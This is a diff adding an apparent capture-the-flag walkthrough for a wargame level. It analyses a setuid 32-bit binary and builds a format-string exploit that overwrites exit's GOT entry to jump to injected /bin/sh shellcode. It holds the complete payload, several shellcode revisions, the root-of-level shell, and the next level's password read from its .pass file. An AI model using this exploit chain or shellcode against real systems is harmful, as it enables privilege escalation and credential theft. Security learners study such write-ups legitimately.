@@ -1,0 +1,461 @@
+#+title: Walkthrough
+* Data Gathering
+** check sec
+#+begin_src shell
+RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
+No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/users/level05/level05
+#+end_src
+** Sticky bit
+#+begin_src shell
+ -rwsr-s---+ 1 level06 users 5176 Sep 10  2016 level05
+#+end_src
+#+begin_quote
+'+' mean that use acls.
+#+end_quote
+** Strings
+#+begin_src shell
+readelf -p .rodata ./$USER
+
+String dump of section '.rodata':
+  No strings found in this section.
+#+end_src
+** Functions
+#+begin_src shell
+All defined functions:
+
+Non-debugging symbols:
+0x080482f8  _init
+0x08048340  printf
+0x08048340  printf@plt
+0x08048350  fgets
+0x08048350  fgets@plt
+0x08048360  __gmon_start__
+0x08048360  __gmon_start__@plt
+0x08048370  exit
+0x08048370  exit@plt
+0x08048380  __libc_start_main
+0x08048380  __libc_start_main@plt
+0x08048390  _start
+0x080483c0  __do_global_dtors_aux
+0x08048420  frame_dummy
+0x08048444  main
+0x08048520  __libc_csu_init
+0x08048590  __libc_csu_fini
+0x08048592  __i686.get_pc_thunk.bx
+0x080485a0  __do_global_ctors_aux
+0x080485cc  _fini
+#+end_src
+#+begin_quote
+Just main look like a custom one.
+#+end_quote
+** Global vars
+#+begin_src shell
+All defined variables:
+
+Non-debugging symbols:
+0x080485e8  _fp_hw
+0x080485ec  _IO_stdin_used
+0x080486e4  __FRAME_END__
+0x080496e8  __CTOR_LIST__
+0x080496e8  __init_array_end
+0x080496e8  __init_array_start
+0x080496ec  __CTOR_END__
+0x080496f0  __DTOR_LIST__
+0x080496f4  __DTOR_END__
+0x080496f8  __JCR_END__
+0x080496f8  __JCR_LIST__
+0x080496fc  _DYNAMIC
+0x080497c8  _GLOBAL_OFFSET_TABLE_
+0x080497e8  __data_start
+0x080497e8  data_start
+0x080497ec  __dso_handle
+0x080497f0  stdin@@GLIBC_2.0
+0x080497f4  completed.6159
+0x080497f8  dtor_idx.6161
+#+end_src
+* Binary Analisis
+** Functions
+#+begin_src shell
+ disass main
+Dump of assembler code for function main:
+   0x08048444 <+0>:	push   ebp
+   0x08048445 <+1>:	mov    ebp,esp
+   0x08048447 <+3>:	push   edi
+   0x08048448 <+4>:	push   ebx
+   0x08048449 <+5>:	and    esp,0xfffffff0
+   0x0804844c <+8>:	sub    esp,0x90
+   0x08048452 <+14>:	mov    DWORD PTR [esp+0x8c],0x0
+   0x0804845d <+25>:	mov    eax,ds:0x80497f0
+   0x08048462 <+30>:	mov    DWORD PTR [esp+0x8],eax
+   0x08048466 <+34>:	mov    DWORD PTR [esp+0x4],0x64
+   0x0804846e <+42>:	lea    eax,[esp+0x28]
+   0x08048472 <+46>:	mov    DWORD PTR [esp],eax
+   0x08048475 <+49>:	call   0x8048350 <fgets@plt>
+   0x0804847a <+54>:	mov    DWORD PTR [esp+0x8c],0x0
+   0x08048485 <+65>:	jmp    0x80484d3 <main+143>
+   0x08048487 <+67>:	lea    eax,[esp+0x28]
+   0x0804848b <+71>:	add    eax,DWORD PTR [esp+0x8c]
+   0x08048492 <+78>:	movzx  eax,BYTE PTR [eax]
+   0x08048495 <+81>:	cmp    al,0x40
+   0x08048497 <+83>:	jle    0x80484cb <main+135>
+   0x08048499 <+85>:	lea    eax,[esp+0x28]
+   0x0804849d <+89>:	add    eax,DWORD PTR [esp+0x8c]
+   0x080484a4 <+96>:	movzx  eax,BYTE PTR [eax]
+   0x080484a7 <+99>:	cmp    al,0x5a
+   0x080484a9 <+101>:	jg     0x80484cb <main+135>
+   0x080484ab <+103>:	lea    eax,[esp+0x28]
+   0x080484af <+107>:	add    eax,DWORD PTR [esp+0x8c]
+   0x080484b6 <+114>:	movzx  eax,BYTE PTR [eax]
+   0x080484b9 <+117>:	mov    edx,eax
+   0x080484bb <+119>:	xor    edx,0x20
+   0x080484be <+122>:	lea    eax,[esp+0x28]
+   0x080484c2 <+126>:	add    eax,DWORD PTR [esp+0x8c]
+   0x080484c9 <+133>:	mov    BYTE PTR [eax],dl
+   0x080484cb <+135>:	add    DWORD PTR [esp+0x8c],0x1
+   0x080484d3 <+143>:	mov    ebx,DWORD PTR [esp+0x8c]
+   0x080484da <+150>:	lea    eax,[esp+0x28]
+   0x080484de <+154>:	mov    DWORD PTR [esp+0x1c],0xffffffff
+   0x080484e6 <+162>:	mov    edx,eax
+   0x080484e8 <+164>:	mov    eax,0x0
+   0x080484ed <+169>:	mov    ecx,DWORD PTR [esp+0x1c]
+   0x080484f1 <+173>:	mov    edi,edx
+   0x080484f3 <+175>:	repnz scas al,BYTE PTR es:[edi]
+   0x080484f5 <+177>:	mov    eax,ecx
+   0x080484f7 <+179>:	not    eax
+   0x080484f9 <+181>:	sub    eax,0x1
+   0x080484fc <+184>:	cmp    ebx,eax
+   0x080484fe <+186>:	jb     0x8048487 <main+67>
+   0x08048500 <+188>:	lea    eax,[esp+0x28]
+   0x08048504 <+192>:	mov    DWORD PTR [esp],eax
+   0x08048507 <+195>:	call   0x8048340 <printf@plt>
+   0x0804850c <+200>:	mov    DWORD PTR [esp],0x0
+   0x08048513 <+207>:	call   0x8048370 <exit@plt>
+End of assembler dump.
+#+end_src
+** Source
+[[source]]
+** Get offset
+#+begin_src shell
+  Get acknoledge of modified char value from [A-Z] ^ ' ' or [0x41-05A] ^ 0x20
+  gdb test
+  (gdb) p 'B'
+  $2 = 66 'B'
+  (gdb) p/x 'B'
+  $5 = 0x42
+  (gdb) p 'B' ^ 0x20
+  $3 = 98
+  (gdb) p/x 'B' ^ 0x20
+  $4 = 0x62
+  # I prefer use @ 0x40 and avoid that feature for at least get the offset.
+  #input
+    @@@@@@@@%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
+    #output
+    @@@@@@@@0x640xf7fcfac0(nil)(nil)(nil)(nil)0xffffffff0xffffdc74(nil)0x404040400x404040400x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x702570250x2570250x630xf7fceff4(nil)(nil)0xf7e455130x10xffffdcd40xffffdcdc0xf7fd3000(nil)0xffffdc1c
+    #offset = 10
+  @@@@@@@@%10$p
+  @@@@@@@@0x40404040
+  @@@@@@@@%10$p%11$p
+  @@@@@@@@0x404040400x40404040
+#+end_src
+** Explotation idea
+#+begin_quote
+the condition that xor the string (to lower) could be a protective layer.
+Write exit got
+#+end_quote
+*** Get write plt.
+#+begin_src shell
+p exit
+$6 = {<text variable, no debug info>} 0xf7e5eb70 <exit>
+(gdb) x/i exit
+   0xf7e5eb70 <exit>:	push   ebx
+(gdb) info functions exit
+All functions matching regular expression "exit":
+
+Non-debugging symbols:
+0x08048370  exit
+0x08048370  exit@plt
+0xf7e5eb70  exit
+0xf7e5eba0  on_exit
+0xf7e5edb0  __cxa_atexit
+0xf7e5ef50  quick_exit
+0xf7e5ef80  __cxa_at_quick_exit
+0xf7ee45c4  _exit
+0xf7f27ec0  pthread_exit
+0xf7f2d4f0  __cyg_profile_func_exit
+0xf7f4bc30  svc_exit
+0xf7f55d80  atexit
+(gdb) p 0x08048370
+$7 = 134513520
+(gdb) x/i 0x08048370
+   0x8048370 <exit@plt>:	jmp    DWORD PTR ds:0x80497e0
+(gdb) info symbol 0x80497e0
+exit@got.plt in section .got.plt of /home/users/level05/level05
+exit_got_plt_va=0x80497e0
+#+end_src
+*** Get buffer va.
+#+begin_src shell
+      #Courtesy of gets with ltrace will help.
+      fgets(a
+            "a\n", 100, 0xf7fcfac0)                                                      = 0xffffdbe8
+
+      buffer_va= 0xffffdbe8
+     exit_plt_got=0x80497e0
+    0x80497e0 <exit@got.plt>:	0x8048376 <exit@plt+6>
+      og_va_plt_got_va=0x8048376
+      #Try to do the less amount and sizes of writes.
+  p (unsigned char[4])(0x8048376 & 0xffffdbe8)
+  $9 = "`\203\004\b"
+  (gdb) p/x (unsigned char[4])(0x8048376 & 0xffffdbe8)
+  $10 = {0x60, 0x83, 0x4, 0x8}
+  (gdb) p/x (unsigned char[4])0x8048376
+  $11 = {0x76, 0x83, 0x4, 0x8}
+  (gdb) p/x (unsigned char[4])0xffffdbe8
+  $12 = {0xe8, 0xdb, 0xff, 0xff}
+  # I couldn't use any byte of the original to use to write the buffer va.
+#+end_src
+*** Get string format
+#+begin_src shell
+  0x08048370
+  p/x (unsigned char[4])0x08048370
+  $13 = {0x70, 0x83, 0x4, 0x8}
+  all fine there is not trouble then.
+  (gdb) p/x (unsigned char[4])0xffffdbe8
+  $12 = {0xe8, 0xdb, 0xff, 0xff}
+  0xdb - 0x10 = 203
+  p 0xe8-0xdb
+  $4 = 13
+  (gdb) p 0xff-0xe8
+  $5 = 23
+  va=4B
+  #if we want we can write Byte to byte.
+  #https://github.com/adamaviv/si485h-f18/blob/master/units/unit_06.md
+  exit_plt_got=0x80497e0
+  %10$p%11$p
+  "\x08\x04\x97\xe1"[::-1]+"\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe2"[::-1]+"\x08\x04\x97\xe3"[::-1] + "%203d%10$hhn%13d%11$hhn%23d%12$hhn%13$hhn"
+
+
+
+
+
+  # Error should i put @got.plt
+  x/4a $eax
+  0xffffdbc8:	0x8048371 <exit@plt+1>	0x8048370 <exit@plt>	0x8048372 <exit@plt+2>	0x8048373 <exit@plt+3>
+  #fixed
+  x/4a $eax
+  0xffffdbc8:	0x80497e1 <exit@got.plt+1>	0x80497e0 <exit@got.plt>	0x80497e2 <exit@got.plt+2>	0x80497e3 <exit@got.plt+3>
+  For what i see i modify the content of the string with this value
+  x/a 0x80497e0
+  0x80497e0 <exit@got.plt>:	0xffffdbe8
+  (gdb) info symbol 0x80497e0
+  exit@got.plt in section .got.plt of /home/users/level05/level05
+
+
+  x/s 0xffffdbe0-24+57
+  57 len Bytes to overwrite got need to put shellcode.
+  23 len Bytes shellcode. "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+  adding the offset to the va overwrited in got.
+  p/x (unsigned char[4])(0xffffdbe8+57)
+  $3 = {0x21, 0xdc, 0xff, 0xff}
+  (gdb) p/x (0xffffdbe8+57)
+  $4 = 0xffffdc21
+
+  p/d 0x21 - 16
+  $5 = 17
+  (gdb) p/d 0xdc-0x21
+  $6 = 187
+  (gdb) p/d 0xff-0xdc
+  $7 = 35
+
+  # 0x41-0x5A modified by toupper.
+  "\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe1"[::-1]+"\x08\x04\x97\xe2"[::-1]+"\x08\x04\x97\xe3"[::-1] + "%17d%10$hhn%187d%11$hhn%35d%12$hhn%13$hhn"+ "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"
+
+
+  #look is working fine
+  x/4a $eax
+  0xffffdbc8:	0x80497e0 <exit@got.plt>	0x80497e1 <exit@got.plt+1>	0x80497e2 <exit@got.plt+2>	0x80497e3 <exit@got.plt+3>
+  #previous to printf
+  (gdb) x/a 0x80497e0
+  0x80497e0 <exit@got.plt>:	0x8048376 <exit@plt+6>
+  (gdb) fin
+  #post printf execution.
+  x/a 0x80497e0
+  0x80497e0 <exit@got.plt>:	0xffffdc21
+  x/23bx 0xffffdbc8+57
+  #x50
+  0xffffdc01:	0x31	0xc0	0x70	0x68	0x2f	0x2f	0x73	0x68
+  0xffffdc09:	0x68	0x2f	0x62	0x69	0x6e	0x89	0xe3	0x70
+  0xffffdc11:	0x73	0x89	0xe1	0xb0	0x0b	0xcd	0x80
+
+  x/23bu 0xffffdbc8+57
+  0xffffdc01:	49	192	112	104	47	47	115	104
+  0xffffdc09:	104	47	98	105	110	137	227	112
+  0xffffdc11:	115	137	225	176	11	205	128
+
+
+  Modify the shellcode for got a little bytecode and not use push eax that cause trouble
+  "\x31\xC0\x6A\x00\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC9\xB0\x0B\xCD\x80"
+
+  0:  31 c0                   xor    eax,eax
+  2:  6a 00                   push   0x0
+  4:  68 2f 2f 73 68          push   0x68732f2f
+  9:  68 2f 62 69 6e          push   0x6e69622f
+  e:  89 e3                   mov    ebx,esp
+  10: 31 c9                   xor    ecx,ecx # argv = NULL
+  12: b0 0b                   mov    al,0xb
+  14: cd 80                   int    0x80
+
+  "\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe1"[::-1]+"\x08\x04\x97\xe2"[::-1]+"\x08\x04\x97\xe3"[::-1] + "%17d%10$hhn%187d%11$hhn%35d%12$hhn%13$hhn"+ "\x31\xC0\x6A\x00\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x31\xC9\xB0\x0B\xCD\x80"
+  We got a null char that cause trouble we gonna append the string at the end of the payload jmp and call to get the string.
+  "\x31\xC0\xEB\x07\x5B\x31\xC9\xB0\x0B\xCD\x80\xE8\xF4\xFF\xFF\xFF"
+
+  Array Literal:
+
+  { 0x31, 0xC0, 0xEB, 0x07, 0x5B, 0x31, 0xC9, 0xB0, 0x0B, 0xCD, 0x80, 0xE8, 0xF4, 0xFF, 0xFF, 0xFF }
+  Disassembly:
+
+  0:  31 c0                   xor    eax,eax
+  2:  eb 07                   jmp    b <_main+0xb>
+  4:  5b                      pop    ebx
+  5:  31 c9                   xor    ecx,ecx
+  7:  b0 0b                   mov    al,0xb
+  9:  cd 80                   int    0x80
+  b:  e8 f4 ff ff ff          call   4 <_main+0x4>
+  "\x31\xC0\xEB\x07\x5B\x31\xC9\xB0\x0B\xCD\x80\xE8\xF4\xFF\xFF\xFF"
+  [where goes the string]
+  +"/bin/sh"
+
+  # https://bista.sites.dmi.unipg.it/didattica/sicurezza-pg/buffer-overrun/hacking-book/0x2a0-writing_shellcode.html
+
+  shellcode= "\x31\xC0\x89\x04\x24\x83\xEC\x04\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x89\x04\x24\x83\xEC\x04\x89\x1C\x24\x8D\x4C\x24\xFC\xB0\x0B\xCD\x80"
+  0:  31 c0                   xor    eax,eax
+  2:  89 04 24                mov    DWORD PTR [esp],eax
+  5:  83 ec 04                sub    esp,0x4
+  8:  68 2f 2f 73 68          push   0x68732f2f
+  d:  68 2f 62 69 6e          push   0x6e69622f
+  12: 89 e3                   mov    ebx,esp
+  14: 89 04 24                mov    DWORD PTR [esp],eax
+  17: 83 ec 04                sub    esp,0x4
+  1a: 89 1c 24                mov    DWORD PTR [esp],ebx
+  1d: 8d 4c 24 fc             lea    ecx,[esp-0x4]
+  21: b0 0b                   mov    al,0xb
+  23: cd 80                   int    0x80
+
+
+  #shellcode
+  "\x31\xC0\x89\x04\x24\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x89\x04\x24\x89\x5C\x24\xFC\x8D\x4C\x24\xF8\xB0\x0B\xCD\x80"
+  Disassembly:
+
+  0:  31 c0                   xor    eax,eax
+  2:  89 04 24                mov    DWORD PTR [esp],eax
+  5:  68 2f 2f 73 68          push   0x68732f2f
+  a:  68 2f 62 69 6e          push   0x6e69622f
+  f:  89 e3                   mov    ebx,esp
+  11: 89 04 24                mov    DWORD PTR [esp],eax
+  14: 89 5c 24 fc             mov    DWORD PTR [esp-0x4],ebx
+  18: 8d 4c 24 f8             lea    ecx,[esp-0x8]
+  1c: b0 0b                   mov    al,0xb
+  1e: cd 80                   int    0x80
+
+  ####
+
+  "\x31\xC0\x89\x04\x24\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x8B\x5C\x24\xFC\x89\x44\x24\xF8\x89\x5C\x24\xF4\x8D\x4C\x24\xF4\xB0\x0B\xCD\x80"
+
+  isassembly:
+
+  0:  31 c0                   xor    eax,eax
+  2:  89 04 24                mov    DWORD PTR [esp],eax
+  5:  68 2f 2f 73 68          push   0x68732f2f
+  a:  68 2f 62 69 6e          push   0x6e69622f
+  f:  8b 5c 24 fc             mov    ebx,DWORD PTR [esp-0x4]
+  13: 89 44 24 f8             mov    DWORD PTR [esp-0x8],eax
+  17: 89 5c 24 f4             mov    DWORD PTR [esp-0xc],ebx
+  1b: 8d 4c 24 f4             lea    ecx,[esp-0xc]
+  1f: b0 0b                   mov    al,0xb
+  21: cd 80                   int    0x80
+
+
+
+  "\x31\xC0\x89\x04\x24\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x83\xEC\x04\x89\x04\x24\x83\xEC\x04\x89\x1C\x24\x8D\x0C\x24\xB0\x0B\xCD\x80"
+
+  Disassembly:
+
+  0:  31 c0                   xor    eax,eax
+  2:  89 04 24                mov    DWORD PTR [esp],eax
+  5:  68 2f 2f 73 68          push   0x68732f2f
+  a:  68 2f 62 69 6e          push   0x6e69622f
+  f:  89 e3                   mov    ebx,esp
+  11: 83 ec 04                sub    esp,0x4
+  14: 89 04 24                mov    DWORD PTR [esp],eax
+  17: 83 ec 04                sub    esp,0x4
+  1a: 89 1c 24                mov    DWORD PTR [esp],ebx
+  1d: 8d 0c 24                lea    ecx,[esp]
+  20: b0 0b                   mov    al,0xb
+  22: cd 80                   int    0x80
+
+#+end_src
+#+begin_src shell
+"\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe1"[::-1]+"\x08\x04\x97\xe2"[::-1]+"\x08\x04\x97\xe3"[::-1] + "%17d%10$hhn%187d%11$hhn%35d%12$hhn%13$hhn"+ [shellcode]
+ shellcode=  "\x31\xC0\x89\x04\x24\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x83\xEC\x04\x89\x04\x24\x83\xEC\x04\x89\x1C\x24\x8D\x0C\x24\xB0\x0B\xCD\x80"
+
+
+           0:  31 c0                   xor    eax,eax
+           2:  89 04 24                mov    DWORD PTR [esp],eax
+           5:  68 2f 2f 73 68          push   0x68732f2f
+           a:  68 2f 62 69 6e          push   0x6e69622f
+           f:  89 e3                   mov    ebx,esp
+           11: 83 ec 04                sub    esp,0x4
+           14: 89 04 24                mov    DWORD PTR [esp],eax
+           17: 83 ec 04                sub    esp,0x4
+           1a: 89 1c 24                mov    DWORD PTR [esp],ebx
+           1d: 8d 0c 24                lea    ecx,[esp]
+           20: b0 0b                   mov    al,0xb
+           22: cd 80                   int    0x80
+#+end_src
+**** Last shellcode.
+#+begin_src shell
+
+       "\x31\xC0\x89\x04\x24\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x83\xEC\x04\x89\x04\x24\x83\xEC\x04\x89\x1C\x24\x89\xE1\xB0\x0B\xCD\x80"
+
+       isassembly:
+
+       0:  31 c0                   xor    eax,eax
+       2:  89 04 24                mov    DWORD PTR [esp],eax
+       5:  68 2f 2f 73 68          push   0x68732f2f
+       a:  68 2f 62 69 6e          push   0x6e69622f
+       f:  89 e3                   mov    ebx,esp
+       11: 83 ec 04                sub    esp,0x4
+       14: 89 04 24                mov    DWORD PTR [esp],eax
+       17: 83 ec 04                sub    esp,0x4
+       1a: 89 1c 24                mov    DWORD PTR [esp],ebx
+       1d: 89 e1                   mov    ecx,esp
+       1f: b0 0b                   mov    al,0xb
+       21: cd 80                   int    0x80
+#+end_src
+**** Other way don't try it
+#+begin_src shell
+     # There is another way that is use system
+     p &system
+   $1 = (<text variable, no debug info> *) 0xf7e6aed0 <system>
+   find &system,+99999999,"/bin/sh"
+   0xf7f897ec
+   We could use a shellcode to launch
+  push 0xf7f897ec
+   xor eax, eax
+   mov    DWORD PTR [esp],eax
+   push 0xf7e6aed0
+  ret
+#+end_src
+
+
+* Explotation
+#+begin_src shell
+  (python -c 'print "\x08\x04\x97\xe0"[::-1]+"\x08\x04\x97\xe1"[::-1]+"\x08\x04\x97\xe2"[::-1]+"\x08\x04\x97\xe3"[::-1] + "%17d%10$hhn%187d%11$hhn%35d%12$hhn%13$hhn" + "\x31\xC0\x89\x04\x24\x68\x2F\x2F\x73\x68\x68\x2F\x62\x69\x6E\x89\xE3\x83\xEC\x04\x89\x04\x24\x83\xEC\x04\x89\x1C\x24\x89\xe1\xB0\x0B\xCD\x80"'; cat -) | ./$USER
+
+id
+uid=1005(level05) gid=1005(level05) euid=1006(level06) egid=100(users) groups=1006(level06),100(users),1005(level05)
+whoami
+level06
+cat /home/users/level06/.pass
+h4GtNnaMs2kZFN92ymTr2DcJHAzMfzLW25Ep59mq
+
+#+end_src
